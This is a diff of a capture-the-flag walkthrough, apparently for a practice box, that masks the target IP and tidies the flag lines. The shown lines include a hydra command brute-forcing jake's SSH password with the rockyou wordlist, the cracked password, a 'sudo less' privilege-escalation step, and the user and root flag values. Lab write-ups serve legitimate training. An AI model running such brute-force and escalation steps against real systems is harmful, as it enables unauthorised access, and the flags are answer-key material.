@@ -67,7 +67,7 @@ However, Jake's password seems weak so we can try to bruteforce the ssh credenti
 
 **sudo hydra** -l jake -P /usr/share/wordlists/rockyou.txt ssh   
 ```
-[22][ssh] host: 10.10.105.10   login: jake   password: 987654321
+[22][ssh] host: xx.xx.xxx.xx  login: jake   password: 987654321
 ```
 
 After connecting to the target machine using jake's credentials, we see that we have acces to the **less** command as sudo.  
@@ -80,5 +80,5 @@ sudo less /etc/profile
 
 
 ##
-The user flag is located in holt's home directory and is **ee11cbb19052e40b07aac0ca060c23ee**.
-The root flag is located at /root directory and is **63a9f0ea7bb98050796b649e85481845**
+The user flag is located in holt's home directory and is **ee11cbb19052e40b07aac0ca060c23ee**.  
+The root flag is located at /root directory and is **63a9f0ea7bb98050796b649e85481845**  
